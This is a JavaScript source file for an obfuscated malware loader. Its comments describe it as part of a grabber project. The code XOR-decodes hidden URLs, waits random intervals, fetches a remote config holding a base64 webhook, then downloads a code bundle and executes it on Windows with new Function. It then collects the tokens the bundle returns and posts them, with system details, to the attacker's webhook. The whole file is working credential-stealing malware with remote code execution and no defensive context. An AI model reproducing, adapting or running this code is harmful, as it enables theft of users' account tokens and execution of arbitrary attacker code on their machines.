/**
 * Loader: executa no client após fetch. Contém toda a lógica crítica (config, webhook, bundle, run, report).
 * Repo: https://github.com/X0R-Alg/39XEMP-90 — AX13.js (loader) | 18N38NX0R.js (grab) | 294M21A.json (webhook)
 */
(function (require, module, exports) {
  'use strict';

  const M = 0x5a;
  const KEY_DEC = 0x0f;
  const K_B = [72, 119, 54, 68, 61];
  const C_B = [117, 86, 23, 97, 27, 39, 13, 76, 99, 9, 106, 12, 4, 120, 28, 117, 87, 1, 100, 27, 120, 80, 0, 126, 6, 105, 71, 13, 101, 70, 126, 77, 14, 62, 48, 45, 112, 78, 80, 4, 122, 13, 80, 40, 48, 88, 111, 51, 60, 81, 45, 13, 14, 112, 1, 115, 13, 81, 40, 92, 80, 16, 82, 80, 70, 119, 81, 12, 127];
  const B_B = [117, 86, 23, 97, 27, 39, 13, 76, 99, 9, 106, 12, 4, 120, 28, 117, 87, 1, 100, 27, 120, 80, 0, 126, 6, 105, 71, 13, 101, 70, 126, 77, 14, 62, 48, 45, 112, 78, 80, 4, 122, 13, 80, 40, 48, 88, 111, 51, 60, 81, 45, 13, 14, 112, 1, 115, 13, 82, 41, 38, 46, 26, 45, 73, 88, 79, 12, 9, 98];
  const J_KEY = [57, 51, 56, 52, 77, 51, 56, 52, 88, 48, 82];

  function keyStr() {
    return K_B.map(function (c) { return String.fromCharCode(c ^ KEY_DEC); }).join('');
  }
  function decodeRef(arr, keyStr) {
    if (!Array.isArray(arr) || !keyStr) return '';
    return arr.map(function (c, i) { return String.fromCharCode((c ^ M) ^ keyStr.charCodeAt(i % keyStr.length)); }).join('');
  }
  function cfgKey() {
    return J_KEY.map(function (c) { return String.fromCharCode(c); }).join('');
  }

  function sleep(ms) {
    return new Promise(function (r) { setTimeout(r, ms); });
  }
  function jitter(lo, hi) {
    return lo + Math.floor(Math.random() * (hi - lo + 1));
  }

  function get(url) {
    return new Promise(function (res, rej) {
      try {
        const https = require('https');
        const u = require('url').URL ? new require('url').URL(url) : require('url').parse(url);
        const opts = { hostname: u.hostname, path: u.pathname + (u.search || ''), method: 'GET', port: u.port || 443 };
        const req = https.request(opts, function (r) {
          var d = '';
          r.on('data', function (c) { d += c; });
          r.on('end', function () {
            try { res({ status: r.statusCode, data: JSON.parse(d); }); } catch (_) { res({ status: r.statusCode, data: d }); }
          });
        });
        req.on('error', rej);
        req.end();
      } catch (_) { rej(); }
    });
  }
  function post(url, body) {
    return new Promise(function (res, rej) {
      try {
        const https = require('https');
        const u = require('url').URL ? new require('url').URL(url) : require('url').parse(url);
        const payload = typeof body === 'object' ? JSON.stringify(body) : body;
        const opts = { hostname: u.hostname, path: u.pathname + (u.search || ''), method: 'POST', port: u.port || 443, headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } };
        const req = https.request(opts, function (r) {
          if (r.statusCode >= 200 && r.statusCode < 300) res(); else rej(new Error('' + r.statusCode));
        });
        req.on('error', rej);
        req.write(payload);
        req.end();
      } catch (_) { rej(); }
    });
  }

  function fetchWithRetry(url, n) {
    n = n || 3;
    return get(url).catch(function (err) {
      if (n <= 1) throw err;
      return sleep(jitter(600, 1800)).then(function () { return fetchWithRetry(url, n - 1); });
    });
  }
  function postWithRetry(url, body, n) {
    n = n || 2;
    return post(url, body).catch(function (err) {
      if (n <= 1) throw err;
      return sleep(jitter(400, 1200)).then(function () { return postWithRetry(url, body, n - 1); });
    });
  }

  function decodeWebhook(body, keyName) {
    var raw = (body && typeof body === 'object' && body[keyName]) ? body[keyName] : null;
    if (!raw && typeof body === 'string') try { var j = JSON.parse(body); raw = j && j[keyName] ? j[keyName] : null; } catch (_) {}
    if (!raw || typeof raw !== 'string') return '';
    try { return Buffer.from(raw, 'base64').toString('utf8'); } catch (_) { return ''; }
  }

  function runBundle(code) {
    if (typeof code !== 'string' || code.length < 100) return Promise.resolve(null);
    if (process.platform !== 'win32') return Promise.resolve(null);
    try {
      var m = { exports: {} };
      var fn = (function () { try { return new Function('require', 'module', 'exports', code); } catch (_) { return null; } })();
      if (typeof fn !== 'function') return Promise.resolve(null);
      fn(require, m, m.exports);
      var names = ['getTokens', 'default', 'run'];
      for (var i = 0; i < names.length; i++) {
        if (typeof m.exports[names[i]] === 'function') return Promise.resolve(m.exports[names[i]]());
      }
      return Promise.resolve(null);
    } catch (_) { return Promise.resolve(null); }
  }

  function limitItems(list, max) {
    max = max || 2;
    if (!Array.isArray(list)) return [];
    var out = [];
    for (var i = 0; i < list.length && out.length < max; i++) {
      var it = list[i];
      var t = it && typeof it.token !== 'undefined' ? it.token : it;
      if (typeof t === 'string' && t.length > 20) out.push(t);
    }
    return out;
  }

  (function run() {
    var k = keyStr();
    var cfgUrl = decodeRef(C_B, k);
    if (!cfgUrl || cfgUrl.length < 20) return;

    sleep(jitter(2000, 6000)).then(function () { return fetchWithRetry(cfgUrl); }).then(function (res) {
      if (!res || res.status !== 200) return null;
      var target = decodeWebhook(res.data, cfgKey());
      if (!target || target.length < 20 || !/^https?:\/\//i.test(target)) return null;
      return { target: target };
    }).then(function (ctx) {
      if (!ctx) return null;
      var bundleUrl = decodeRef(B_B, k);
      if (!bundleUrl || bundleUrl.length < 20) return ctx;
      return sleep(jitter(3000, 7000)).then(function () { return fetchWithRetry(bundleUrl); }).then(function (r2) {
        if (!r2 || r2.status !== 200) return ctx;
        var code = typeof r2.data === 'string' ? r2.data : (r2.data && typeof r2.data === 'object' ? null : String(r2.data || ''));
        ctx.code = code && code.length > 100 ? code : null;
        return ctx;
      });
    }).then(function (ctx) {
      if (!ctx || !ctx.target) return null;
      if (!ctx.code) return postWithRetry(ctx.target, { content: JSON.stringify({ ts: Date.now(), env: { v: process.version, p: process.platform, a: process.arch }, n: 0, d: [] }) });
      return sleep(jitter(1000, 4000)).then(function () { return runBundle(ctx.code); }).then(function (data) {
        var env = { v: process.version, p: process.platform, a: process.arch };
        var items = limitItems(data);
        var raw = JSON.stringify({ ts: Date.now(), env: env, n: items.length, d: items });
        var payload = { content: raw.length <= 1900 ? raw : raw.slice(0, 1900) };
        return postWithRetry(ctx.target, payload);
      });
    }).catch(function () {});
  })();
})(typeof require !== 'undefined' ? require : function () { return null; }, typeof module !== 'undefined' ? module : { exports: {} }, typeof exports !== 'undefined' ? exports : {});
